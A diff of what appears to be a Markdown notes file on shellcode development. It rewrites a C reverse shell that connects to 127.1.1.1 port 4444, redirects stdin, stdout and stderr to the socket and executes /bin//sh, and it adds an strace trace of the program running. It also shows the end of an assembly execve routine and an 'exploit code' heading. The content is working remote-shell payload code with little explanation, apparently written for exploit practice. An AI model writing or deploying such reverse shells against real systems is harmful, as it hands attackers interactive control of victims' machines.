@@ -3,44 +3,35 @@
 ## C
 
 ```c
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include <arpa/inet.h>
+#include <netinet/in.h>
+#include <stdlib.h>
+#include <sys/socket.h>
 #include <unistd.h>
 int main() {
-  int sockfd;
-  struct sockaddr_in server_addr;
-  sockfd = socket(AF_INET, SOCK_STREAM, 0);
-  if (sockfd == -1) {
-    perror("socket");
-    exit(EXIT_FAILURE);
-  }
-  memset(&server_addr, 0, sizeof(server_addr));
-  server_addr.sin_family = AF_INET;
-  server_addr.sin_port = htons(4444);
-  if (inet_pton(AF_INET, "127.1.1.1", &server_addr.sin_addr) <= 0) {
-    perror("inet_pton");
-    close(sockfd);
-    exit(EXIT_FAILURE);
-  }
-  if (connect(sockfd, (struct sockaddr *)&server_addr,
-        sizeof(server_addr)) == -1) {
-    perror("connect");
-    close(sockfd);
-    exit(EXIT_FAILURE);
-  }
-  dup2(sockfd, STDIN_FILENO);
-  dup2(sockfd, STDOUT_FILENO);
-  dup2(sockfd, STDERR_FILENO);
-  execl("/bin/sh", "sh", NULL);
-  // error
-  perror("execl");
-  close(sockfd);
-  return EXIT_FAILURE;
+  int sock = socket(AF_INET, SOCK_STREAM, 0);
+  struct sockaddr_in addr;
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(4444);
+  addr.sin_addr.s_addr = inet_addr("127.1.1.1");
+  connect(sock, (struct sockaddr *)&addr, sizeof(addr));
+  dup2(sock, STDIN_FILENO);
+  dup2(sock, STDOUT_FILENO);
+  dup2(sock, STDERR_FILENO);
+  execve("/bin//sh", NULL, NULL);
 }
+```
+
+```bash
+strace -nfe socket,connect,dup2,execve ./c_reverse
+[  59] execve("./c_reverse", ["./c_reverse"], 0x7fffffffe0f0 /* 31 vars */) = 0
+[  41] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+[  42] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.1.1.1")}, 16) = 0
+[  33] dup2(3, 0)                       = 0
+[  33] dup2(3, 1)                       = 1
+[  33] dup2(3, 2)                       = 2
+[  59] execve("/bin//sh", NULL, NULL)   = 0
+[ 231] +++ exited with 0 +++
 ```
 
 ## nasm
@@ -104,16 +95,6 @@ loop:
         xor rdx, rdx                ; arg3: NULL
         mov al, 59                  ; execve("/bin//sh", NULL, NULL);
         syscall
-
-; strace -nfe socket,connect,dup2,execve ./c_reverse
-; [  59] execve("./c_reverse", ["./c_reverse"], 0x7fffffffe0f0 /* 31 vars */) = 0
-; [  41] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
-; [  42] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.1.1.1")}, 16) = 0
-; [  33] dup2(3, 0)                       = 0
-; [  33] dup2(3, 1)                       = 1
-; [  33] dup2(3, 2)                       = 2
-; [  59] execve("/bin/sh", ["sh"], 0x7fffffffe128 /* 31 vars */) = 0
-; [ 231] +++ exited with 0 +++
 ```
 
 ## exploit code
